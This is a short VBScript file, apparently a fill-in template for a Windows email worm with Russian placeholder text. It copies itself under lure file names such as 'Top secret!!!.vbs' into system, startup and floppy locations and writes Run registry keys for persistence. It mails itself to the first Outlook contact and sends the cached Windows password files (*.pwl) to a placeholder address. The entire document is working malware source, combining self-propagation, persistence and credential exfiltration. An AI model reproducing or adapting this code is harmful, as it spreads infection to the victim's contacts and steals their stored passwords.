Option Explicit
On Error Resume Next
Dim FileSysObject, File
Set FileSysObject = CreateObject ("Scripting.FileSystemObject")
Set File = FileSysObject.GetFile(WScript.ScriptFullName)
File.Copy ("c:\windows\Бюллютень.vbs")
File.Copy ("A:\Совершенно секретно!!!.vbs")
File.Copy ("C:\Windows\главное меню\программы\автозагрузка\MsOffice-VBSScript.vbs")
File.Copy ("C:\Мои документы\Совершенно секретно!!.vbs")
Dim WshShell
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Reget2", "c:\windows\Бюллютень.vbs"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Conect", "C:\WINDOWS\Бюллютень.vbs"
Dim OutlookObject, OutMail
Set OutlookObject = CreateObject("Outlook.Application")
Set OutMail = OutlookObject.CreateItem(0)
OutMail.to = OutlookObject.GetNameSpace("MAPI").AddressLists(1).AddressEntries(1)
OutMail.Subject = "Тема залипухи"
OutMail.Body = "Залипуха" 
OutMail.Attachments.Add(WScript.ScriptFullName)
OutMail.Send
Dim OutlookObject2, OutMail2
Set OutlookObject2 = CreateObject("Outlook.Application")
Set OutMail2 = OutlookObject.CreateItem(0)
OutMail2.to = "Ваш Емаил"
OutMail2.Subject = "Тема письма"
OutMail2.Body = "Текст письма"
OutMail2.Attachments.Add"C:\Windows\*.pwl"
OutMail2.Send
